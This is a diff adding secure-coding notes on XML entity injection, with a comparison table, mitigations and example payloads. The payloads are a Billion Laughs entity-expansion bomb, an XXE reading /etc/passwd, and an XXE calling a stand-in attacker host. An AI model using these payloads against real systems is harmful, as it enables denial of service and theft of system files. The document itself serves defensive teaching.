@@ -1,7 +1,72 @@
 Vulnerabilities when parsing untrusted or potentially malicious XML: 
 
-1) XML Entity Injection (internal and external entity):
+1) XML Entity Injection:
 Remediation: Disable entity parsing
+
+Internal and External entity Injection Key Differences:
+Aspect	         Internal Entity Injection	                                                        External Entity Injection (XXE)
+Entity           Definition	Internal to the XML document (<!ENTITY example "value">)	              External reference (e.g., SYSTEM or PUBLIC)
+Resource Access	 Limited to the document itself	                                                    Can access external resources (e.g., files, URLs)
+Primary Risk	   Denial of Service (e.g., Billion Laughs Attack)	                                  Data exfiltration, sensitive file access, or remote requests
+Complexity	     Exploits defined entities in the document	                                        Exploits external system or network resources
+Example Attack	 Billion Laughs Attack	                                                            XXE (e.g., exposing /etc/passwd)
+
+Mitigation Strategies:
+Disable Entity Parsing: Disable all entity parsing unless explicitly required.
+Set Resource Limits: Limit recursion depth and memory usage in the XML parser to prevent DoS attacks (e.g., Billion Laughs).
+Validate Input: Validate the XML schema to ensure it adheres to the expected format. Reject XML with unexpected <!DOCTYPE> sections or entities.
+Use Secure Libraries: Use XML parsers that are configured to block external entities (e.g., libxml2, expat).
+Sanitize Input: Accept XML only from trusted sources.
+
+1.1) Internal Entity Injection
+Internal Entity Injection exploits internally defined entities in the XML document. Entities are typically defined directly within the XML document's <!DOCTYPE> section and 
+are referenced within the XML content.
+
+Characteristics:
+Definition Location: Entities are declared within the <!DOCTYPE> section of the XML document.
+Scope: Limited to the current document and does not depend on external resources.
+Usage: References to these entities are replaced with their defined values during XML parsing.
+
+Exploit XML Example: Billion Laughs Attack, this recursive expansion can consume excessive memory and cause the application to crash.
+
+<!DOCTYPE root [
+    <!ENTITY lol1 "lol">
+    <!ENTITY lol2 "&lol1;&lol1;">
+    <!ENTITY lol3 "&lol2;&lol2;&lol2;">
+    <!ENTITY lol4 "&lol3;&lol3;&lol3;">
+    <!ENTITY lol5 "&lol4;&lol4;&lol4;">
+]>
+<root>
+    <data>&lol5;</data>
+</root>
+
+1.2) External Entity Injection (XXE)
+External Entity Injection exploits externally defined entities, which are declared using the SYSTEM or PUBLIC keyword and reference external resources like files or URLs.
+
+Characteristics:
+Definition Location: Entities are defined using SYSTEM (file or URL) or PUBLIC identifiers in the <!DOCTYPE> section.
+Scope: Can access external resources, such as files or network endpoints.
+Usage: The parser fetches and processes the content of the external resource.
+
+Exploit XML Example1: Stealing Sensitive Files
+<!DOCTYPE root [
+    <!ENTITY example SYSTEM "file:///etc/passwd">
+]>
+<root>
+    <data>&example;</data>
+</root>
+
+Exploit XML Example2: Triggering Remote Requests, the parser would make an HTTP request to http://attacker.com/malicious, potentially leaking sensitive information or allowing remote code execution.
+<!DOCTYPE root [
+    <!ENTITY example SYSTEM "http://attacker.com/malicious">
+]>
+<root>
+    <data>&example;</data>
+</root>
+
+
+
+
 
 2) Denial of Service (DoS) from excessively large or deeply nested XML (XML Bomb/Billion Laughs Attack):
 Remediation: Limit Input Size and Complexity: Implement checks to restrict the size and nesting depth of XML documents to prevent DoS attacks.
